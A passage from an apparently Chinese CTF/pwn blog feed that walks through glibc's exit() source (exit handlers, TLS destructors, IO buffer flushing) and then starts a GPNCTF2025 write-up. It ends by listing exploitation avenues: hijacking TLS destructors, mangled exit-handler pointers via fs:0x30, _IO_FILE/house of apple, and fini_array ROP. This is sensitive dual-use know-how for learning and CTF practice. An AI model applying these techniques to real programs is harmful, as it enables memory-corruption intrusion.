class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">     atexit/on_exit registrations.  */</span></span><br><span class="line">  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">      <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free:</span><br><span class="line">    <span class="keyword">case</span> ef_us:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:</span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br><span class="line">      arg = f-&gt;func.on.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      onfct (status, arg);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      atfct ();</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment"> we must mark this function as ef_free.  */</span></span><br><span class="line">      f-&gt;flavor = ef_free;</span><br><span class="line">      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">      arg = f-&gt;func.cxa.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      cxafct (arg, status);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">       more exit functions.  Start the loop over.  */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line"><span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="__call_tls_dtors">__call_tls_dtors</h3><ul><li>首先会调用一个比较关键的函数<code>__call_tls_dtors ()</code>，该函数与<strong>线程局部存储</strong>有关。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先调用TLS析构函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br></pre></td></tr></table></figure><h3 id="调用注册函数">调用注册函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">        <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">            <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">            <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">            <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> ef_free:</span><br><span class="line">            <span class="keyword">case</span> ef_us:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ef_on:</span><br><span class="line">              onfct = f-&gt;func.on.fn;</span><br><span class="line">              arg = f-&gt;func.on.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">              PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">              onfct (status, arg);</span><br><span class="line">              __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">              atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">              PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">              atfct ();</span><br><span class="line">              __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">case</span> ef_cxa:</span><br><span class="line">              f-&gt;flavor = ef_free;</span><br><span class="line">              cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">              arg = f-&gt;func.cxa.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">              PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">              cxafct (arg, status);</span><br><span class="line">              __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    *listp = cur-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="built_in">free</span> (cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="刷新io缓冲区">刷新IO缓冲区</h3><ul><li>最后在<code>_exit(status)</code>执行之间还会有<code>RUN_HOOK (__libc_atexit, ());</code>，我们会在<code>/libio/genops.c</code>中找到<code>__libc_atexit</code>这个函数。这里还出现了<code>_IO_cleanup</code>以及<code>text_set_element</code>宏定义</li><li>而<code>__libc_atexit</code>其实是位于libc中的一个段（即一块内存空间，该空间名为<code>__libc_atexit</code>）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text_set_element(__libc_atexit, _IO_cleanup);</span><br></pre></td></tr></table></figure><ul><li>而这个宏定义出现在<code>glibc-2.35\glibc-2.35\include\libc-symbols.h</code></li><li>这个宏定义其实就是将<code>_IO_cleanup</code>，写入到<code>__libc_atexit</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Make SYMBOL, which is in the text segment, an element of SET.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> text_set_element(set, symbol)_elf_set_element(set, symbol)</span></span><br></pre></td></tr></table></figure><ul><li>最后在回到<code> RUN_HOOK (__libc_atexit, ());</code>这个位置其实就很好理解了。这个代码其实执行的就是<code>_IO_cleanup</code>。</li><li>而<code>_IO_cleanup</code>会调用<code>_IO_flush_all_lockp (0);</code>是刷新已经打开的流，并在需要的时候上一个锁机制。还会调用<code>_IO_unbuffer_all ();</code>用于将所有打开的流的缓冲模式变成无缓冲模式，然后将缓冲区进行释放。</li><li><code>_IO_unbuffer_all ()、_IO_flush_all_lockp (0)</code>这两个函数都是<code>IO</code>函数，在调试<code>exit()</code>的时候就不需要仔细调试，可以放在调试<code>IO</code>的时候仔细调试。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>下面这个是<code>_IO_flush_all_lockp</code>的代码。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">        run_fp = fp;</span><br><span class="line">        <span class="keyword">if</span> (do_lock)</span><br><span class="line">            _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">        || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">        )</span><br><span class="line">        &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (do_lock)</span><br><span class="line">            _IO_funlockfile (fp);</span><br><span class="line">        run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">    _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>下面这个就是<code>_IO_unbuffer_all ();</code>的源码。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> legacy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (_IO_vtable_offset (fp) != <span class="number">0</span>))</span><br><span class="line">        legacy = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">        &amp;&amp; (legacy || fp-&gt;_mode != <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">            <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (! legacy &amp;&amp; ! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">            &#123;</span><br><span class="line">                fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">                fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">                freeres_list = fp;</span><br><span class="line">                fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (! legacy &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">            _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">            <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">            _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (! legacy)</span><br><span class="line">fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">    _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exit函数调试">exit函数调试</h2><h1 id="exit函数执行流程开始时">exit函数执行流程(开始时)</h1><ul><li>exit函数在开始的时候并没有执行，而是进行动态链接，将<code>exit()</code>函数的地址绑定到起来。但是这一绑定的过程其实是比较容易利用的。</li></ul><h1 id="总结">总结</h1><ul><li><p>对于<code>exit</code>函数的利用其实就是好几个：</p><ul><li>利用<code>__call_tls_dtors</code>这个TLS析构函数，该函数会触发一个函数指针。</li><li>利用注册函数，但是这个函数通常会被<code>fs:0x30</code>加密，如果想要修改注册函数，就必须先泄露<code>fs:0x30</code>或者先修改<code>fs:0x30</code>。</li><li><code>IO</code>函数刷新缓冲区，这个其实就是<code>_IO_FILE</code>的利用，<code>house of apple</code>就与这个相关了，进行这个利用其实是最经常用的了。</li><li>劫持<code>rtdl_fini()</code>中的函数指针，劫持<code>l_info伪造fini_array节</code>，使用<code>fini_array</code>进行ROP，以及<code>劫持fini</code></li></ul></li><li><p>为了加深对<code>exit()</code>函数的执行过程，其实对应<code>IO</code>利用的<code>exit()</code>函数这里暂时不拿例题。只拿<code>exit()</code>函数其他两个利用的例题。</p></li></ul><h1 id="题目1">题目1——</h1>]]></content>
    
    
    <summary type="html">前言：暑假看exit函数流程不太明白，最近牢的一题对exit有比较清晰了。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>GPNCTF2025复现</title>
    <link href="http://iyheart.github.io/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/"/>
    <id>http://iyheart.github.io/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-09-05T14:35:04.000Z</published>
    <updated>2025-09-05T15:55:26.932Z</updated>
    
    <content type="html"><![CDATA[<h1 id="碎碎念">碎碎念</h1><p><strong>对于写WP个人的见解</strong>：</p><p>对于一些比赛，虽然有写wp，但是其实本人是想着一个方向或者多个方向复现完再发的，但是这比较困难，因为每个比赛的每个方向题目都是有简单、有困难的。简单的题目还好，可能一下子就复现完了，但是剩下的比较困难的题目就很难受了可能会因为知识储备不足而无法自己独立做出。虽然说是有wp可以看，但是看wp的目的是能学到东西，而不是利用脚本一把梭一下。</p><p>所以在复现比赛题目的时候往往对自己要求比较高，而遇到难的短时间复现不了，时间一长好像就把题目鸽了<code>(老毛病了)QAQ</code>。这就导致我写的wp感觉还是比较少的。并且一些比赛题目是用AI一把梭的（AI一把梭的根本学不到东西），对于这种情况我是更希望复现完了再发wp的。</p><p><strong>对于CTF中使用AI的一些碎碎念</strong>：</p><p>高中物理老师说过，考试是考试，考试要有考试的技巧；平时刷题就要踏踏实实的刷题；考试过后对于试卷的题目也是需要踏踏实实的。</p><p>而CTF比赛其实某种程度上也相当于考试吧，而大部分CTF比赛都允许使用AI的，这就导致在比赛中使用AI就相当于一个考试的技巧，黑猫白猫抓到老鼠的都是好猫——能解出题目的AI就是好AI（哈哈哈哈）。这就导致了大部分人遇到题目就会直接把题目附件之类的直接丢给AI一把梭（包括我自己）。</p><p>所以这个暑假就期间就已经开始反思了，就觉得AI一把梭是真学不到东西，赛后也是一鸽再鸽，所以干脆在平时的CTF比赛中减少AI一把梭的次数，并且拿到题目附件的时候并不是第一时间丢给AI，而是认认真真的看懂代码，对于代码中不明白的部分再去询问AI（这样总比直接复制粘贴丢给AI能学到东西），只有实在没思路的题目还是需要AI一把梭的（毕竟CTF是个竞赛，还是个团队协作的比赛，都能用AI一把梭的但是你不会，也只能先使用AI一把梭把flag梭出来再说了）。</p><h1 id="crypto">Crypto</h1><h2 id="hinting">hinting</h2><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 